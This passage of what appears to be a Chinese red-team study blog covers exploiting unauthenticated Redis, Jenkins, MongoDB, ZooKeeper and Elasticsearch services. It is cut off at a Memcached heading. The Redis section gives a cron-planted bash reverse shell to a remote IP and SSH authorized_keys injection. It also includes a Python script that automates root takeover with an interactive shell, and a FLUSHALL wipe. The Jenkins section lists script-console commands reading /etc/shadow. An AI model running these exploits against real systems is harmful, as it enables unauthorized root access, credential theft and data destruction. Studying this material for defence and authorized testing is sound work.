        <content type="html"><![CDATA[<p>这类问题覆盖的应用、利用方式较广，因此只举例频次较高的漏洞。<br>文章内容主要摘自某红队系列丛书，将市面上现在流传的 redteam 系列书籍进行一个学习记录。</p><h2 id="0x01-Redis"><a href="#0x01-Redis" class="headerlink" title="0x01 Redis"></a>0x01 Redis</h2><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库</p><h3 id="redis-cli"><a href="#redis-cli" class="headerlink" title="redis-cli"></a>redis-cli</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ redis-cli -h <span class="token number">127.0</span>.0.1 -p <span class="token number">6379</span><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> keys *<span class="token punctuation">(</span>empty array<span class="token punctuation">)</span><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/03/31/ViB5WSTA.png"></p><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/vulhub/redis/4-unacc<span class="token punctuation">]</span>└─$ redis-cli -h <span class="token number">127.0</span>.0.1 -p <span class="token number">6379</span> <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> keys *<span class="token punctuation">(</span>empty array<span class="token punctuation">)</span><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG GET <span class="token function">dir</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"dir"</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"/data"</span>   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG SET <span class="token function">dir</span> /tmp/   OK   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> SET foobar <span class="token string">"who are you? f1ve"</span>   OK   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG GET dbfilename<span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"dbfilename"</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"dump.rdb"</span>   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG SET dbfilename write_file.log   OK   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> save   OK   <span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/03/31/EYuIQHos.png"></p><h3 id="反弹shell-Linux"><a href="#反弹shell-Linux" class="headerlink" title="反弹shell-Linux"></a>反弹shell-Linux</h3><p>在redis以root权限运行</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> <span class="token builtin class-name">set</span> x <span class="token string">"<span class="token entity" title="\n">\n</span>* * * * * bash -i >&amp; /dev/tcp/192.168.186.26/4444 0>&amp;1<span class="token entity" title="\n">\n</span>"</span>OK<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cronOK<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG SET dbfilename rootOK<span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="写入公钥"><a href="#写入公钥" class="headerlink" title="写入公钥"></a>写入公钥</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#获取rsa</span>$ ssh-keygen -t rsa<span class="token comment">#将公钥写入foo.txt，注意内容前后要加2个换行</span><span class="token punctuation">(</span>echo -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span> <span class="token function">cat</span> /root/.ssh/id_rsa.pub<span class="token punctuation">;</span> <span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span> <span class="token operator">></span> foo.txt<span class="token comment">#将foo.txt放入键crackit里</span><span class="token function">cat</span> foo.txt <span class="token operator">|</span> redis-cli -h IP -x <span class="token builtin class-name">set</span> crackit<span class="token comment">#连接目标</span>redis-cli -h IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/03/31/to7ybOWZ.png"></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#设置目标的redis的配置文件</span><span class="token comment">#设置数据库备份目录为/root/.ssh/</span><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG SET <span class="token function">dir</span> /root/.ssh/OK<span class="token comment">#设置数据库备份文件名为authorized_keys</span><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> CONFIG <span class="token builtin class-name">set</span> dbfilename <span class="token string">"authorized_keys"</span>OK<span class="token comment">#此时公钥成功写入目标机，文件名为authorized_keys</span><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> saveOK<span class="token comment">#利用私钥连接目标</span><span class="token function">ssh</span> -i /root/.ssh/id_rsa root@127.0.0.1<span class="token builtin class-name">set</span> x <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>脚本检测：</p><p>可以自动化执行上述写入公钥步骤，并且执行 id 命令</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding:utf-8</span><span class="token comment">#redis未授权交互式检测脚本</span><span class="token comment">#commands: python3 redis_shell.py ip</span><span class="token keyword">import</span> redis<span class="token keyword">import</span> sys<span class="token keyword">import</span> paramikorsa_pub <span class="token operator">=</span> <span class="token string">'/home/kali/.ssh/id_rsa.pub'</span><span class="token comment"># 公钥路径</span>pkey <span class="token operator">=</span> <span class="token string">'/home/kali/.ssh/id_rsa'</span><span class="token comment">#密钥路径</span><span class="token comment"># 获取公钥内容</span><span class="token keyword">def</span> <span class="token function">get_id_rsa_pub</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>rsa_pub<span class="token punctuation">,</span> <span class="token string">'rt'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    id_rsa_pub <span class="token operator">=</span> <span class="token string">'\n\n\n&#123;&#125;\n\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> id_rsa_pub  <span class="token keyword">def</span> <span class="token function">shell_redis</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">try</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> redis<span class="token punctuation">.</span>Redis<span class="token punctuation">(</span>host<span class="token operator">=</span>ip<span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> socket_timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">,</span> <span class="token string">'/root/.ssh/'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] : config set dir /root/.ssh/'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dbfilename'</span><span class="token punctuation">,</span> <span class="token string">'authorized_keys'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] : config set dbfilename "authorized_keys"'</span><span class="token punctuation">)</span>    id_rsa_pub <span class="token operator">=</span> get_id_rsa_pub<span class="token punctuation">(</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'crackit'</span><span class="token punctuation">,</span> id_rsa_pub<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] : set crackit'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] : save'</span><span class="token punctuation">)</span>    key <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>RSAKey<span class="token punctuation">.</span>from_private_key_file<span class="token punctuation">(</span>pkey<span class="token punctuation">)</span>    ssh <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SSHClient<span class="token punctuation">(</span><span class="token punctuation">)</span>    ssh<span class="token punctuation">.</span>set_missing_host_key_policy<span class="token punctuation">(</span>paramiko<span class="token punctuation">.</span>AutoAddPolicy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ssh<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">,</span> username<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span> pkey<span class="token operator">=</span>key<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>    ssh_stdin<span class="token punctuation">,</span> ssh_stdout<span class="token punctuation">,</span> ssh_stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span>    content <span class="token operator">=</span> ssh_stdout<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> content<span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[ok] connect to &#123;&#125; : &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> content<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>      command <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'&#123;&#125; >>> '</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>      ssh_stdin<span class="token punctuation">,</span> ssh_stdout<span class="token punctuation">,</span> ssh_stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span>command<span class="token punctuation">)</span>      contents <span class="token operator">=</span> ssh_stdout<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">for</span> content <span class="token keyword">in</span> contents<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>  <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    error <span class="token operator">=</span> e<span class="token punctuation">.</span>args    <span class="token keyword">if</span> error <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      error <span class="token operator">=</span> <span class="token string">'save error'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] [&#123;&#125;] : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>error<span class="token punctuation">,</span> ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>  ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  shell_redis<span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://imgtp.apqiang.com/2022/04/01/UTbAUG0g.png"></p><h3 id="清空数据库"><a href="#清空数据库" class="headerlink" title="清空数据库"></a>清空数据库</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">127.0</span>.0.1:637<span class="token operator"><span class="token file-descriptor important">9</span>></span> FLUSHALLOK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装配置可参考文章：</p><p><a href="https://www.cnblogs.com/-mo-/p/11487797.html">https://www.cnblogs.com/-mo-/p/11487797.html</a></p><h2 id="0x02-Jenkins"><a href="#0x02-Jenkins" class="headerlink" title="0x02 Jenkins"></a>0x02 Jenkins</h2><p>默认是8080端口 未授权访问就是任意用户都能访问 都能执行命令</p><p>127.0.0.1:8080/jenkins/manage</p><p>127.0.0.1:8080/jenkins/script</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">#命令集合println <span class="token string">"whoami"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text#<span class="token class-name">Linux</span>println <span class="token string">"ifconfig -a"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textprintln <span class="token string">"cat /etc/passwd"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textprintln <span class="token string">"cat /etc/shadow"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text#<span class="token class-name">Windows</span>println <span class="token string">"ipconfig /all"</span><span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textdef sout <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> serr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>def proc <span class="token operator">=</span> 'ipconfig'<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span>proc<span class="token punctuation">.</span><span class="token function">consumeProcessOutput</span><span class="token punctuation">(</span>sout<span class="token punctuation">,</span> serr<span class="token punctuation">)</span>proc<span class="token punctuation">.</span><span class="token function">waitForOrKill</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>println <span class="token string">"out> $sout err>$serr"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="进入后台"><a href="#进入后台" class="headerlink" title="进入后台"></a>进入后台</h3><p><img src="https://imgtp.apqiang.com/2022/04/01/6gYytwSB.png"></p><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p><img src="https://imgtp.apqiang.com/2022/04/01/e6Gv868S.png"></p><p>也可以添加Terminal Plugin插件</p><h2 id="0x03-MongoDB"><a href="#0x03-MongoDB" class="headerlink" title="0x03 MongoDB"></a>0x03 MongoDB</h2><p>默认端口：27017</p><p>脚本检测</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8</span><span class="token comment"># mongodb未授权检测脚本</span><span class="token comment"># usage: python3 mongodb_unauth.py ip port</span><span class="token comment"># 默认端口 28017 和 27017</span><span class="token keyword">from</span> pymongo <span class="token keyword">import</span> MongoClient<span class="token keyword">import</span> sysip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>conn <span class="token operator">=</span> MongoClient<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> socketTimeoutMS<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token comment">#连接MongoDB,延时5秒</span>dbs <span class="token operator">=</span> conn<span class="token punctuation">.</span>database_names<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] -> &#123;&#125;:&#123;&#125; database_names : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> dbs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>error <span class="token operator">=</span> e<span class="token punctuation">.</span>args<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] -> &#123;&#125;:&#123;&#125; error : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x04-ZooKeeper"><a href="#0x04-ZooKeeper" class="headerlink" title="0x04 ZooKeeper"></a>0x04 ZooKeeper</h2><p>默认端口：2181 2171</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ls</span> /<span class="token comment"># 查看所有节点</span>get /<span class="token comment">#获取某个节点信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>脚本检测</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8</span><span class="token comment"># python3 zookeeper_unauth.py IP 2181</span><span class="token keyword">from</span> kazoo<span class="token punctuation">.</span>client <span class="token keyword">import</span> KazooClient<span class="token keyword">import</span> sys<span class="token comment"># 检测是否存在未授权漏洞</span><span class="token keyword">def</span> <span class="token function">check_zookeeper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">try</span><span class="token punctuation">:</span>zk <span class="token operator">=</span> KazooClient<span class="token punctuation">(</span>hosts<span class="token operator">=</span><span class="token string">'&#123;&#125;:&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>zk<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>childrens <span class="token operator">=</span> zk<span class="token punctuation">.</span>get_children<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>childrens<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] -> &#123;&#125;:&#123;&#125; &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> childrens<span class="token punctuation">)</span><span class="token punctuation">)</span>zk<span class="token punctuation">.</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>zk<span class="token punctuation">.</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span>error <span class="token operator">=</span> e<span class="token punctuation">.</span>args<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] error: &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>port <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>check_zookeeper<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x05-Elasticsearch"><a href="#0x05-Elasticsearch" class="headerlink" title="0x05 Elasticsearch"></a>0x05 Elasticsearch</h2><p>默认端口：9200</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost:9200&#x2F;_plugin&#x2F;head&#x2F;web管理界面http:&#x2F;&#x2F;localhost:9200&#x2F;_cat&#x2F;indiceshttp:&#x2F;&#x2F;localhost:9200&#x2F;_river&#x2F;_search查看数据库敏感信息http:&#x2F;&#x2F;localhost:9200&#x2F;_nodes查看节点数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>脚本检测</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8</span><span class="token comment"># elasticsearch未授权检测脚本</span><span class="token comment"># usage: python3 elasticsearch_unauth.py ip port</span><span class="token comment"># 默认端口9200</span><span class="token comment"># http://localhost:9200/_plugin/head/ web管理界面</span><span class="token comment"># http://localhost:9200/_cat/indices</span><span class="token comment"># http://localhost:9200/_river/_search 查看数据库敏感信息</span><span class="token comment"># http://localhost:9200/_nodes 查看节点数据</span><span class="token keyword">import</span> sys<span class="token keyword">from</span> elasticsearch <span class="token keyword">import</span> Elasticsearch<span class="token keyword">import</span> requests<span class="token keyword">import</span> jsonip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 9200</span><span class="token keyword">try</span><span class="token punctuation">:</span>    es <span class="token operator">=</span> Elasticsearch<span class="token punctuation">(</span><span class="token string">"&#123;&#125;:&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token comment"># 连接Elasticsearch,延时5秒</span>    es<span class="token punctuation">.</span>indices<span class="token punctuation">.</span>create<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token string">'unauth_text'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] 成功连接 ：&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;&#125; -> 成功创建测试节点unauth_text'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>    es<span class="token punctuation">.</span>index<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token string">"unauth_text"</span><span class="token punctuation">,</span> doc_type<span class="token operator">=</span><span class="token string">"test-type"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span> body<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"text"</span><span class="token punctuation">:</span> <span class="token string">"text"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;&#125; -> 成功往节点unauth_text插入数据'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>    ret <span class="token operator">=</span> es<span class="token punctuation">.</span>get<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token string">"unauth_text"</span><span class="token punctuation">,</span> doc_type<span class="token operator">=</span><span class="token string">"test-type"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;&#125; -> 成功获取节点unauth_text数据 : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">)</span>    es<span class="token punctuation">.</span>indices<span class="token punctuation">.</span>delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token string">'unauth_text'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] &#123;&#125; -> 清除测试节点unauth_text数据'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] &#123;&#125; -> 存在ElasticSearch未授权漏洞'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'尝试获取节点信息：↓'</span><span class="token punctuation">)</span>    text <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">'http://&#123;&#125;:&#123;&#125;/_nodes'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>    nodes_total <span class="token operator">=</span> text<span class="token punctuation">[</span><span class="token string">'_nodes'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'total'</span><span class="token punctuation">]</span>    nodes <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>text<span class="token punctuation">[</span><span class="token string">'nodes'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[ok] &#123;&#125; -> [&#123;&#125;] : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> nodes_total<span class="token punctuation">,</span> nodes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    error <span class="token operator">=</span> e<span class="token punctuation">.</span>args    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[-] -> &#123;&#125;  error : &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x06-Memcached"><a href="#0x06-Memcached" class="headerlink" title="0x06 Memcached"></a>0x06 